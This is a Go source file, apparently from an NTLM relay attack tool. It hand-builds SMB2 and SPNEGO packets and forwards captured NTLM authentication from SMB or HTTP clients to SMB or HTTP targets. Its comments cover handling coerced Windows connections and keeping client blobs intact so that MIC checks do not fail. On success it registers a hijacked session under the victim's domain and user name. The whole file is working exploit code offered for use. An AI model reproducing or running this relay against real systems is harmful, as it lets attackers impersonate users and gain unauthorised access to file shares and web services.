package main

import (
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"
)

type smbRelayConn struct {
	up        *rawUpstream
	scheme    string
	host      string
	port      int
	targetURL string
	isSMB     bool
	isMSSQL   bool
	smbState  *smbRelayState
}

type smbRelayState struct {
	sessionID       uint64
	nextMsgID       uint64
	maxReadSize     uint32
	maxWriteSize    uint32
	maxTransactSize uint32
	serverGUID      [16]byte
}

// findFirstHTTPTarget returns the first http:// or https:// target, or "".
func findFirstHTTPTarget() string {
	for _, t := range targets {
		if strings.HasPrefix(t, "http://") || strings.HasPrefix(t, "https://") {
			return t
		}
	}
	return ""
}

// findFirstSMBTarget returns the first smb:// target, or "".
func findFirstSMBTarget() string {
	for _, t := range targets {
		if strings.HasPrefix(t, "smb://") {
			return t
		}
	}
	return ""
}

// ---------------------------------------------------------------------------
// SMB2 client-side packet builders
// ---------------------------------------------------------------------------

// buildSMB2NegotiateRequest builds a client-side SMB2 Negotiate with dialect 0x0210 (SMB 2.1).
func buildSMB2NegotiateRequest() []byte {
	// Header(64) + NegotiateBody(36) + Dialect(2) = 102
	pkt := make([]byte, 4+102)
	binary.BigEndian.PutUint32(pkt[0:4], 102) // NetBIOS length

	// SMB2 header
	copy(pkt[4:8], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(pkt[8:10], 64)         // StructureSize
	binary.LittleEndian.PutUint16(pkt[10:12], 0)         // CreditCharge
	binary.LittleEndian.PutUint16(pkt[16:18], SMB2_NEGOTIATE) // Command
	binary.LittleEndian.PutUint16(pkt[18:20], 1)         // CreditRequest
	// MessageID = 0 (first message)

	// Negotiate body at offset 68 (4 + 64)
	binary.LittleEndian.PutUint16(pkt[68:70], 36) // StructureSize
	binary.LittleEndian.PutUint16(pkt[70:72], 1)  // DialectCount
	binary.LittleEndian.PutUint16(pkt[72:74], 0x01) // SecurityMode: signing enabled
	// Capabilities = 0
	// Client GUID (random 16 bytes)
	rand.Read(pkt[80:96])
	// Dialects at offset 104 (68 + 36)
	binary.LittleEndian.PutUint16(pkt[104:106], SMB2_DIALECT_0210)

	return pkt
}

// buildSMB2SessionSetupRequest builds a Session Setup request with a SPNEGO security blob.
func buildSMB2SessionSetupRequest(msgID, sessionID uint64, secBlob []byte) []byte {
	// Header(64) + SessionSetupBody(24) + secBlob
	bodySize := 24 + len(secBlob)
	pkt := make([]byte, 4+64+bodySize)
	binary.BigEndian.PutUint32(pkt[0:4], uint32(64+bodySize)) // NetBIOS length

	// SMB2 header
	copy(pkt[4:8], []byte{0xFE, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(pkt[8:10], 64)              // StructureSize
	binary.LittleEndian.PutUint16(pkt[10:12], 1)              // CreditCharge
	binary.LittleEndian.PutUint16(pkt[16:18], SMB2_SESSION_SETUP) // Command
	binary.LittleEndian.PutUint16(pkt[18:20], 1)              // CreditRequest
	binary.LittleEndian.PutUint64(pkt[28:36], msgID)          // MessageID
	binary.LittleEndian.PutUint64(pkt[44:52], sessionID)      // SessionID

	// Session Setup body at offset 68
	binary.LittleEndian.PutUint16(pkt[68:70], 25) // StructureSize
	pkt[70] = 0                                     // Flags
	pkt[71] = 0x01                                  // SecurityMode: signing enabled
	// Capabilities = 0
	// Channel = 0
	securityOffset := uint16(88) // 64 (header) + 24 (body fixed fields)
	binary.LittleEndian.PutUint16(pkt[80:82], securityOffset)
	binary.LittleEndian.PutUint16(pkt[82:84], uint16(len(secBlob)))
	// PreviousSessionID = 0

	// Security blob at offset 92 (4 + 88)
	copy(pkt[92:], secBlob)

	return pkt
}

// parseSMB2NegotiateResponse parses a Negotiate Response and extracts server parameters.
func parseSMB2NegotiateResponse(packet []byte) (*smbRelayState, error) {
	if len(packet) < 64+65 {
		return nil, fmt.Errorf("negotiate response too short (%d bytes)", len(packet))
	}

	status := binary.LittleEndian.Uint32(packet[8:12])
	if status != STATUS_SUCCESS {
		return nil, fmt.Errorf("negotiate failed: status 0x%08x", status)
	}

	state := &smbRelayState{}

	// Negotiate response body starts at offset 64
	// StructureSize at 64, SecurityMode at 66, DialectRevision at 68
	dialect := binary.LittleEndian.Uint16(packet[68:70])
	if dialect != SMB2_DIALECT_0210 {
		return nil, fmt.Errorf("unexpected dialect 0x%04x (expected 0x0210)", dialect)
	}

	copy(state.serverGUID[:], packet[72:88])
	state.maxTransactSize = binary.LittleEndian.Uint32(packet[92:96])
	state.maxReadSize = binary.LittleEndian.Uint32(packet[96:100])
	state.maxWriteSize = binary.LittleEndian.Uint32(packet[100:104])

	// Check if server requires signing
	securityMode := binary.LittleEndian.Uint16(packet[66:68])
	if securityMode&0x02 != 0 { // SigningRequired bit
		return state, fmt.Errorf("target requires SMB signing (relay will likely fail)")
	}

	return state, nil
}

// ---------------------------------------------------------------------------
// SPNEGO builders for client-side (Type 1 init, Type 3 response)
// ---------------------------------------------------------------------------

// buildSPNEGOInit wraps a raw NTLM Type 1 in a GSS-API SPNEGO NegTokenInit (tag 0x60).
func buildSPNEGOInit(rawNTLM []byte) []byte {
	// NTLMSSP OID: 1.3.6.1.4.1.311.2.2.10
	ntlmsspOID := []byte{0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}

	// mechTypes [a0] SEQUENCE OF OID
	mechTypesSeq := append([]byte{0x30}, encodeLength(len(ntlmsspOID))...)
	mechTypesSeq = append(mechTypesSeq, ntlmsspOID...)
	mechTypes := append([]byte{0xa0}, encodeLength(len(mechTypesSeq))...)
	mechTypes = append(mechTypes, mechTypesSeq...)

	// mechToken [a2] OCTET STRING (raw NTLM)
	octetString := append([]byte{0x04}, encodeLength(len(rawNTLM))...)
	octetString = append(octetString, rawNTLM...)
	mechToken := append([]byte{0xa2}, encodeLength(len(octetString))...)
	mechToken = append(mechToken, octetString...)

	// inner SEQUENCE
	seqData := append(mechTypes, mechToken...)
	seq := append([]byte{0x30}, encodeLength(len(seqData))...)
	seq = append(seq, seqData...)

	// NegTokenInit [a0]
	negTokenInit := append([]byte{0xa0}, encodeLength(len(seq))...)
	negTokenInit = append(negTokenInit, seq...)

	// SPNEGO OID: 1.3.6.1.5.5.2
	spnegoOID := []byte{0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02}

	// APPLICATION 0 [0x60] wrapping OID + NegTokenInit
	appData := append(spnegoOID, negTokenInit...)
	app := append([]byte{0x60}, encodeLength(len(appData))...)
	app = append(app, appData...)

	return app
}

// buildSPNEGOAuth wraps a raw NTLM Type 3 in a SPNEGO NegTokenResp (tag 0xa1).
func buildSPNEGOAuth(rawNTLM []byte) []byte {
	// responseToken [a2] OCTET STRING
	octetString := append([]byte{0x04}, encodeLength(len(rawNTLM))...)
	octetString = append(octetString, rawNTLM...)
	responseToken := append([]byte{0xa2}, encodeLength(len(octetString))...)
	responseToken = append(responseToken, octetString...)

	// SEQUENCE
	seq := append([]byte{0x30}, encodeLength(len(responseToken))...)
	seq = append(seq, responseToken...)

	// NegTokenResp [a1]
	resp := append([]byte{0xa1}, encodeLength(len(seq))...)
	resp = append(resp, seq...)

	return resp
}

// ---------------------------------------------------------------------------
// SMB target relay (SMB → SMB)
// ---------------------------------------------------------------------------

// smbRelayType1SMB relays an NTLM Type 1 to the first SMB target.
// clientSecBlob is the full SPNEGO security blob from the SMB client — forwarded as-is
// to preserve SPNEGO mechListMIC and avoid MIC validation failures.
func smbRelayType1SMB(clientAddr string, clientSecBlob []byte) (*smbRelayConn, []byte, error) {
	smbTarget := findFirstSMBTarget()
	if smbTarget == "" {
		return nil, nil, fmt.Errorf("no SMB target available")
	}

	u, err := url.Parse(smbTarget)
	if err != nil {
		return nil, nil, fmt.Errorf("parse target URL: %w", err)
	}

	hostport, _, _ := parseTarget(u)
	hostOnly := u.Hostname()

	// Skip if we already have an active session for this target.
	// Windows coercion sends 3 SMB connections; only the first needs to relay.
	sessionsMu.RLock()
	if byPort, ok := sessions[hostOnly]; ok {
		if byUser, ok := byPort[445]; ok {
			for _, sess := range byUser {
				if !sess.Dead.Load() {
					sessionsMu.RUnlock()
					return nil, nil, fmt.Errorf("active session already exists for %s", smbTarget)
				}
			}
		}
	}
	sessionsMu.RUnlock()

	// TCP connect to target
	conn, err := net.DialTimeout("tcp4", hostport, 5*time.Second)
	if err != nil {
		return nil, nil, fmt.Errorf("connect to %s: %w", smbTarget, err)
	}

	// Send SMB2 Negotiate
	negReq := buildSMB2NegotiateRequest()
	if _, err := conn.Write(negReq); err != nil {
		conn.Close()
		return nil, nil, fmt.Errorf("send negotiate to %s: %w", smbTarget, err)
	}

	// Read Negotiate Response
	negResp, err := readNetBIOSPacket(conn)
	if err != nil {
		conn.Close()
		return nil, nil, fmt.Errorf("read negotiate response from %s: %w", smbTarget, err)
	}

	state, err := parseSMB2NegotiateResponse(negResp)
	if err != nil && state == nil {
		conn.Close()
		return nil, nil, fmt.Errorf("parse negotiate response from %s: %w", smbTarget, err)
	}

	state.nextMsgID = 1

	// Send Session Setup with client's SPNEGO blob forwarded as-is
	setupReq := buildSMB2SessionSetupRequest(state.nextMsgID, 0, clientSecBlob)
	state.nextMsgID++

	if _, err := conn.Write(setupReq); err != nil {
		conn.Close()
		return nil, nil, fmt.Errorf("send session setup 1 to %s: %w", smbTarget, err)
	}

	// Read Session Setup Response (should have STATUS_MORE_PROCESSING_REQUIRED)
	setupResp, err := readNetBIOSPacket(conn)
	if err != nil {
		conn.Close()
		return nil, nil, fmt.Errorf("read session setup 1 response from %s: %w", smbTarget, err)
	}

	if len(setupResp) < 64+9 {
		conn.Close()
		return nil, nil, fmt.Errorf("session setup 1 response too short from %s", smbTarget)
	}

	respStatus := binary.LittleEndian.Uint32(setupResp[8:12])
	if respStatus != STATUS_MORE_PROCESSING_REQUIRED {
		conn.Close()
		return nil, nil, fmt.Errorf("unexpected status 0x%08x from %s (expected MORE_PROCESSING_REQUIRED)", respStatus, smbTarget)
	}

	// Extract SessionID from response
	state.sessionID = binary.LittleEndian.Uint64(setupResp[40:48])

	// Extract target's security blob (SPNEGO with Type 2) — pass through as-is
	secOffset := binary.LittleEndian.Uint16(setupResp[64+4 : 64+6])
	secLength := binary.LittleEndian.Uint16(setupResp[64+6 : 64+8])

	if secLength == 0 || int(secOffset)+int(secLength) > len(setupResp) {
		conn.Close()
		return nil, nil, fmt.Errorf("invalid security blob in session setup 1 response from %s", smbTarget)
	}

	// Return the target's SPNEGO blob directly to the client
	respSecBlob := make([]byte, secLength)
	copy(respSecBlob, setupResp[secOffset:secOffset+secLength])

	// Build rawUpstream for session management
	up := &rawUpstream{
		conn: conn,
		br:   bufio.NewReader(conn),
		host: hostOnly,
	}

	relay := &smbRelayConn{
		up:        up,
		scheme:    "SMB",
		host:      hostOnly,
		port:      445,
		targetURL: smbTarget,
		isSMB:     true,
		smbState:  state,
	}

	return relay, respSecBlob, nil
}

// smbRelayType3SMB completes the NTLM relay to an SMB target.
// clientSecBlob is the full SPNEGO security blob from the SMB client.
// rawNTLM is the extracted NTLM bytes used only for identity extraction.
func smbRelayType3SMB(relay *smbRelayConn, clientSecBlob, rawNTLM []byte) (bool, string, error) {
	domain, user, _, err := parseNTLMv2AuthIdentity(rawNTLM)
	if err != nil {
		return false, "", fmt.Errorf("parse Type 3 identity: %w", err)
	}
	fullUser := strings.ToUpper(domain) + `\` + user

	// Forward client's SPNEGO blob as-is to preserve mechListMIC
	setupReq := buildSMB2SessionSetupRequest(relay.smbState.nextMsgID, relay.smbState.sessionID, clientSecBlob)
	relay.smbState.nextMsgID++

	if _, err := relay.up.conn.Write(setupReq); err != nil {
		return false, fullUser, fmt.Errorf("send session setup 2 to %s: %w", relay.targetURL, err)
	}

	// Read response
	setupResp, err := readNetBIOSPacket(relay.up.conn)
	if err != nil {
		return false, fullUser, fmt.Errorf("read session setup 2 response from %s: %w", relay.targetURL, err)
	}

	if len(setupResp) < 64 {
		return false, fullUser, fmt.Errorf("session setup 2 response too short from %s", relay.targetURL)
	}

	status := binary.LittleEndian.Uint32(setupResp[8:12])
	if status != STATUS_SUCCESS {
		return false, fullUser, nil
	}

	// Authentication succeeded — register session with SMBClient
	// Set fields directly on SMBClient before registerSession, since
	// registerSession calls Init() before we can populate Session.Data.
	pc := &SMBClient{
		upSessionID:     relay.smbState.sessionID,
		upNextMsgID:     relay.smbState.nextMsgID,
		maxReadSize:     relay.smbState.maxReadSize,
		maxWriteSize:    relay.smbState.maxWriteSize,
		maxTransactSize: relay.smbState.maxTransactSize,
	}
	copy(pc.serverGUID[:], relay.smbState.serverGUID[:])

	_, err = registerSession("SMB", relay.host, relay.port, fullUser, relay.up, pc)
	if err != nil {
		return false, fullUser, fmt.Errorf("register session: %w", err)
	}

	return true, fullUser, nil
}

// ---------------------------------------------------------------------------
// HTTP proxy → SMB target relay
// ---------------------------------------------------------------------------

// httpSMBRelays stores in-progress SMB relay connections between the HTTP
// handler's Type 1 and Type 3 calls. Key: "clientKey|targetURL".
var httpSMBRelays sync.Map

// httpRelayToSMB relays NTLM from the HTTP proxy to an SMB target.
// For Type 1: connects to SMB target, negotiates, sends wrapped Type 1, returns raw Type 2.
// For Type 3: completes auth, registers SMBClient session on success.
func httpRelayToSMB(stateKey, targetURL string, ntlmType uint32, rawNTLM []byte) (serverCreds []byte, ok bool, fullUser string, err error) {
	if ntlmType == 1 {
		creds, err := httpRelaySMBType1(stateKey, targetURL, rawNTLM)
		return creds, false, "", err
	}
	if ntlmType == 3 {
		ok, fullUser, err := httpRelaySMBType3(stateKey, rawNTLM)
		return nil, ok, fullUser, err
	}
	return nil, false, "", fmt.Errorf("unexpected NTLM type %d", ntlmType)
}

func httpRelaySMBType1(stateKey, targetURL string, rawNTLM []byte) ([]byte, error) {
	u, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("parse target URL: %w", err)
	}

	hostport, _, _ := parseTarget(u)
	hostOnly := u.Hostname()

	// Check for existing active session
	sessionsMu.RLock()
	if byPort, ok := sessions[hostOnly]; ok {
		if byUser, ok := byPort[445]; ok {
			for _, sess := range byUser {
				if !sess.Dead.Load() {
					sessionsMu.RUnlock()
					return nil, fmt.Errorf("active session already exists for %s", targetURL)
				}
			}
		}
	}
	sessionsMu.RUnlock()

	// TCP connect to target
	conn, err := net.DialTimeout("tcp4", hostport, 5*time.Second)
	if err != nil {
		return nil, fmt.Errorf("connect to %s: %w", targetURL, err)
	}

	// SMB2 Negotiate
	if _, err := conn.Write(buildSMB2NegotiateRequest()); err != nil {
		conn.Close()
		return nil, fmt.Errorf("send negotiate: %w", err)
	}

	negResp, err := readNetBIOSPacket(conn)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("read negotiate response: %w", err)
	}

	state, err := parseSMB2NegotiateResponse(negResp)
	if err != nil && state == nil {
		conn.Close()
		return nil, fmt.Errorf("parse negotiate response: %w", err)
	}
	state.nextMsgID = 1

	// Session Setup with SPNEGO-wrapped Type 1
	spnegoBlob := buildSPNEGOInit(rawNTLM)
	setupReq := buildSMB2SessionSetupRequest(state.nextMsgID, 0, spnegoBlob)
	state.nextMsgID++

	if _, err := conn.Write(setupReq); err != nil {
		conn.Close()
		return nil, fmt.Errorf("send session setup: %w", err)
	}

	setupResp, err := readNetBIOSPacket(conn)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("read session setup response: %w", err)
	}

	if len(setupResp) < 64+9 {
		conn.Close()
		return nil, fmt.Errorf("session setup response too short")
	}

	respStatus := binary.LittleEndian.Uint32(setupResp[8:12])
	if respStatus != STATUS_MORE_PROCESSING_REQUIRED {
		conn.Close()
		return nil, fmt.Errorf("unexpected status 0x%08x (expected MORE_PROCESSING_REQUIRED)", respStatus)
	}

	state.sessionID = binary.LittleEndian.Uint64(setupResp[40:48])

	// Extract SPNEGO blob containing Type 2
	secOffset := binary.LittleEndian.Uint16(setupResp[64+4 : 64+6])
	secLength := binary.LittleEndian.Uint16(setupResp[64+6 : 64+8])
	if secLength == 0 || int(secOffset)+int(secLength) > len(setupResp) {
		conn.Close()
		return nil, fmt.Errorf("invalid security blob in response")
	}

	respSecBlob := setupResp[secOffset : secOffset+secLength]

	// Extract raw NTLM Type 2 from SPNEGO wrapper
	rawType2 := extractNTLMFromBlob(respSecBlob)
	if rawType2 == nil {
		conn.Close()
		return nil, fmt.Errorf("failed to extract Type 2 from SPNEGO blob")
	}

	// Store relay state for Type 3
	up := &rawUpstream{
		conn: conn,
		br:   bufio.NewReader(conn),
		host: hostOnly,
	}
	relay := &smbRelayConn{
		up:        up,
		scheme:    "SMB",
		host:      hostOnly,
		port:      445,
		targetURL: targetURL,
		isSMB:     true,
		smbState:  state,
	}
	httpSMBRelays.Store(stateKey, relay)

	return rawType2, nil
}

func httpRelaySMBType3(stateKey string, rawNTLM []byte) (bool, string, error) {
	val, ok := httpSMBRelays.LoadAndDelete(stateKey)
	if !ok {
		return false, "", fmt.Errorf("no pending SMB relay for key %s", stateKey)
	}
	relay := val.(*smbRelayConn)

	domain, user, _, err := parseNTLMv2AuthIdentity(rawNTLM)
	if err != nil {
		relay.up.conn.Close()
		return false, "", fmt.Errorf("parse Type 3 identity: %w", err)
	}
	fullUser := strings.ToUpper(domain) + `\` + user

	// Session Setup with SPNEGO-wrapped Type 3
	spnegoBlob := buildSPNEGOAuth(rawNTLM)
	setupReq := buildSMB2SessionSetupRequest(relay.smbState.nextMsgID, relay.smbState.sessionID, spnegoBlob)
	relay.smbState.nextMsgID++

	if _, err := relay.up.conn.Write(setupReq); err != nil {
		relay.up.conn.Close()
		return false, fullUser, fmt.Errorf("send session setup: %w", err)
	}

	setupResp, err := readNetBIOSPacket(relay.up.conn)
	if err != nil {
		relay.up.conn.Close()
		return false, fullUser, fmt.Errorf("read session setup response: %w", err)
	}

	if len(setupResp) < 64 {
		relay.up.conn.Close()
		return false, fullUser, fmt.Errorf("session setup response too short")
	}

	status := binary.LittleEndian.Uint32(setupResp[8:12])
	if status != STATUS_SUCCESS {
		relay.up.conn.Close()
		return false, fullUser, nil
	}

	// Auth succeeded — register SMBClient session
	pc := &SMBClient{
		upSessionID:     relay.smbState.sessionID,
		upNextMsgID:     relay.smbState.nextMsgID,
		maxReadSize:     relay.smbState.maxReadSize,
		maxWriteSize:    relay.smbState.maxWriteSize,
		maxTransactSize: relay.smbState.maxTransactSize,
	}
	copy(pc.serverGUID[:], relay.smbState.serverGUID[:])

	if _, err := registerSession("SMB", relay.host, 445, fullUser, relay.up, pc); err != nil {
		relay.up.conn.Close()
		return false, fullUser, fmt.Errorf("register session: %w", err)
	}

	return true, fullUser, nil
}

// ---------------------------------------------------------------------------
// HTTP target relay (SMB → HTTP) — existing functions
// ---------------------------------------------------------------------------

// smbRelayType1 relays an NTLM Type 1 message to the first HTTP target.
func smbRelayType1(clientAddr string, rawNTLM []byte, useSPNEGO bool) (*smbRelayConn, []byte, error) {
	httpTarget := findFirstHTTPTarget()
	if httpTarget == "" {
		return nil, nil, fmt.Errorf("no HTTP target available")
	}

	u, err := url.Parse(httpTarget)
	if err != nil {
		return nil, nil, fmt.Errorf("parse target URL: %w", err)
	}

	// probe target for NTLM support
	if ok, err := probeNTLMAuth(httpTarget); !ok {
		return nil, nil, fmt.Errorf("target %s doesn't support NTLM: %v", httpTarget, err)
	}

	// establish upstream connection
	key := "smb-relay|" + clientAddr + "|" + u.String()
	up, err := getOrCreateUpstream(key, u)
	if err != nil {
		return nil, nil, fmt.Errorf("upstream connection to %s failed: %w", httpTarget, err)
	}

	// send Type 1 to HTTP target
	bw := bufio.NewWriter(up.conn)
	authHeader := "NTLM " + base64.StdEncoding.EncodeToString(rawNTLM)
	if err := writeRawGET(bw, up.path, up.host, authHeader); err != nil {
		return nil, nil, fmt.Errorf("write Type 1 to %s: %w", httpTarget, err)
	}

	// read response with Type 2
	resp, err := readHTTPResponse(up.br)
	if err != nil {
		return nil, nil, fmt.Errorf("read Type 2 from %s: %w", httpTarget, err)
	}
	_ = drainBody(resp)

	// extract Type 2 from WWW-Authenticate header
	wwwAuth := resp.Header.Get("WWW-Authenticate")
	if wwwAuth == "" {
		return nil, nil, fmt.Errorf("no WWW-Authenticate header from %s", httpTarget)
	}

	parts := strings.SplitN(wwwAuth, " ", 2)
	if len(parts) != 2 {
		return nil, nil, fmt.Errorf("malformed WWW-Authenticate from %s", httpTarget)
	}

	type2Bytes, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, nil, fmt.Errorf("decode Type 2 from %s: %w", httpTarget, err)
	}

	// build security blob for SMB response
	var secBlob []byte
	if useSPNEGO {
		secBlob = wrapInSPNEGO(type2Bytes)
	} else {
		secBlob = type2Bytes
	}

	// determine port
	_, hostHdr, _ := parseTarget(u)
	hostOnly := u.Hostname()
	p := 80
	if u.Scheme == "https" {
		p = 443
	}
	if _, portStr, err := net.SplitHostPort(hostHdr); err == nil {
		if pp, err := strconv.Atoi(portStr); err == nil {
			p = pp
		}
	}

	relay := &smbRelayConn{
		up:        up,
		scheme:    strings.ToUpper(u.Scheme),
		host:      hostOnly,
		port:      p,
		targetURL: httpTarget,
	}

	return relay, secBlob, nil
}

// smbRelayType3 relays an NTLM Type 3 message to complete the HTTP relay.
func smbRelayType3(relay *smbRelayConn, rawNTLM []byte) (bool, string, error) {
	domain, user, _, err := parseNTLMv2AuthIdentity(rawNTLM)
	if err != nil {
		return false, "", fmt.Errorf("parse Type 3 identity: %w", err)
	}
	fullUser := strings.ToUpper(domain) + `\` + user

	// send Type 3 to HTTP target
	bw := bufio.NewWriter(relay.up.conn)
	authHeader := "NTLM " + base64.StdEncoding.EncodeToString(rawNTLM)
	if err := writeRawGET(bw, relay.up.path, relay.up.host, authHeader); err != nil {
		return false, fullUser, fmt.Errorf("write Type 3 to %s: %w", relay.targetURL, err)
	}

	// read response
	resp, err := readHTTPResponse(relay.up.br)
	if err != nil {
		return false, fullUser, fmt.Errorf("read auth response from %s: %w", relay.targetURL, err)
	}
	_ = drainBody(resp)

	// check success
	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
		// remove from upstream pool — session will own this connection
		upstreamMutex.Lock()
		for k, v := range upstreamByClient {
			if v == relay.up {
				delete(upstreamByClient, k)
				break
			}
		}
		upstreamMutex.Unlock()

		// register session
		pc := &HTTPClient{}
		if _, err := registerSession(relay.scheme, relay.host, relay.port, fullUser, relay.up, pc); err != nil {
			return false, fullUser, fmt.Errorf("register session: %w", err)
		}

		return true, fullUser, nil
	}

	return false, fullUser, nil
}
